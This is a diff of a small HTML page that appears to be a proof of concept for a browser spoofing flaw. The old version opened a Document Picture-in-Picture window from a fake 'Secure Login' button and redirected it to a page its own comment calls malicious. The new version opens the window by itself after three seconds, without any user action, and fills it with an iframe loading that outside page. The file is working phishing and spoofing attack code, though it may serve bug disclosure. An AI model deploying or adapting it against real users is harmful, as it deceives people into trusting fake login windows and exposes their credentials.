@@ -1,20 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-<div onclick="redirectSpoof()" style="cursor:pointer;padding:20px;background:blue;color:white;">
-    Click for Secure Login
-</div>
-
 <script>
-async function redirectSpoof() {
-    const pip = await documentPictureInPicture.requestWindow({
-        width: 600, 
-        height: 700
-    });
-    
-    // Langsung redirect ke external malicious page
-    pip.location.href = "https://sauceialist.github.io/dia/test3.html";
-}
+// Auto-trigger setelah 3 detik
+setTimeout(async () => {
+    try {
+        const pip = await documentPictureInPicture.requestWindow({
+            width: 450, 
+            height: 300
+        });
+        
+        // Load external content langsung
+        pip.document.write(`
+            <iframe src="https://sauceialist.github.io./dia/test3.html" 
+                    style="width:100%;height:100%;border:none;position:fixed;top:0;left:0">
+            </iframe>
+        `);
+        
+    } catch(e) {}
+}, 3000);
 </script>
 </body>
 </html>
